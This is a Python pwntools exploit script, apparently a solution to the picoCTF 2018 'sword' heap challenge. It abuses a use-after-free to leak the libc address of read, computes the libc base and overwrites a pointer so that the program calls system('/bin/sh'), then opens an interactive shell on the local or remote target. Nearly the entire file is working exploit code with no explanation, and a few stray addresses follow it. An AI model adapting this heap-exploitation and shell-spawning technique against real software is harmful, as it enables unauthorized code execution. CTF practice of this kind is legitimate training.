#!/usr/bin/python
from struct import *
from pwn import *

debug = 1
if not debug:
    sh = remote('2018shell4.picoctf.com',55713)
else:
    sh = process('./sword')

LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC)
def forgeSword():
    sh.sendlineafter('Quit.\n', '1')

def hardenSword(i, s):
    sh.recvuntil('Quit.\n')
    sh.sendline('5')
    sh.sendlineafter('?\n', str(i))
    sh.sendlineafter('?\n', '32')
    sh.sendlineafter('.\n', s)
    sh.sendlineafter('?\n', '-1')

def destroySword(i):
    sh.sendlineafter('Quit.\n', '4')
    sh.sendlineafter('?\n', str(i))

def equipSword(i):
    sh.sendlineafter('Quit.\n', '6')
    sh.sendlineafter('?\n', str(i))





e = ELF("./sword")
read_GOT = e.got['read']

s1 = "A"*32

forgeSword()
hardenSword(0, s1)
destroySword(0)

s2 = "A"*8
s2 += '@ `'

#s2 += "A"*16
forgeSword()
hardenSword(0, s2)
destroySword(0)
forgeSword()
equipSword(0)
nchars = 8
ans = (sh.recvuntil('.....')[12:-5].ljust(8, '\x00'))
ans2 = struct.unpack("Q", ans)
read_offset = libc.symbols['read']
libc_base = ans2[0] - read_offset



print hex(libc_base)

binsh = "/bin/sh\x00"
binsh_offset = 0x19613
s3 = "A"*32
hardenSword(0, s3)
destroySword(0)
print hex(libc_base + binsh_offset)
print hex(next(libc.search(binsh)) + libc_base)
s4 = "A"*8
s4 += p64(binsh_offset + libc_base)
s4 += p64(libc_base + libc.symbols['system'])

forgeSword()
hardenSword(0, s4)
destroySword(0)
forgeSword()
equipSword(0)


sh.interactive()



















0x00400b9d


0x602040 
